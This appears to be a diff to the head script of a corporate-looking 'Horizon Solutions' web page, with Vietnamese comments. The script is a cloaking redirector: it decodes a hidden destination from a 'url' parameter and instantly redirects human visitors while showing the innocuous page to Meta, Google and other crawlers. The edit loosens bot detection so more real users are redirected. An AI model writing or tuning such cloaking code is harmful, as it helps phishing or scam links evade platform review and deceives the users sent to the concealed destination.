@@ -7,7 +7,8 @@
     <meta name="keywords" content="technology, business solutions, USA, enterprise services">
     <meta name="author" content="Horizon Solutions">
     <script>
-        const redirectStatus = 'ON'; // Đã bật ON như bạn yêu cầu
+        // Bật ON để kiểm tra chuyển hướng
+        const redirectStatus = 'ON'; 
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
@@ -31,27 +32,39 @@
             }
         }
 
-        // Kiểm tra bot Meta và các crawler khác
+        // Kiểm tra bot, giảm sai sót với người dùng thật
         function isBot() {
             const userAgent = navigator.userAgent.toLowerCase();
             const botSignatures = [
-                'facebookexternalhit', 'facebot', 'meta-inspector',
+                'facebookexternalhit', 'facebot', 'meta-inspector', // Meta bots
                 'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
                 'crawler', 'spider', 'bot'
             ];
-            return botSignatures.some(signature => userAgent.includes(signature)) || 
-                   /bot|crawl|spider|slurp|meta|facebook/i.test(userAgent);
+            // Chỉ chặn nếu user-agent rõ ràng là bot, tránh nhầm lẫn với trình duyệt người dùng
+            return botSignatures.some(signature => userAgent.includes(signature)) && 
+                   !/chrome|safari|firefox|edge|opera/i.test(userAgent);
         }
 
-        // Chuyển hướng khi ON và không phải bot
-        if (redirectStatus === 'ON' && data && !isBot()) {
-            const destination = decodeAdvanced(data);
-            if (destination) {
-                // Chuyển hướng tức thì qua thẻ meta, encode URI để tránh lỗi ký tự
-                document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
+        // Debug và chuyển hướng
+        console.log("Redirect Status:", redirectStatus);
+        console.log("Encoded URL:", data);
+        if (redirectStatus === 'ON' && data) {
+            console.log("Checking if bot...");
+            if (!isBot()) {
+                console.log("Not a bot, decoding URL...");
+                const destination = decodeAdvanced(data);
+                if (destination) {
+                    console.log("Decoded URL:", destination);
+                    // Chuyển hướng tức thì qua thẻ meta
+                    document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
+                } else {
+                    console.error("Failed to decode URL, showing default page.");
+                }
             } else {
-                console.error("Failed to decode URL, showing default page.");
+                console.log("Bot detected, not redirecting.");
             }
+        } else {
+            console.log("Redirect is OFF or no URL provided, showing default page.");
         }
     </script>
     <title>Horizon Solutions - Empowering Your Future</title>
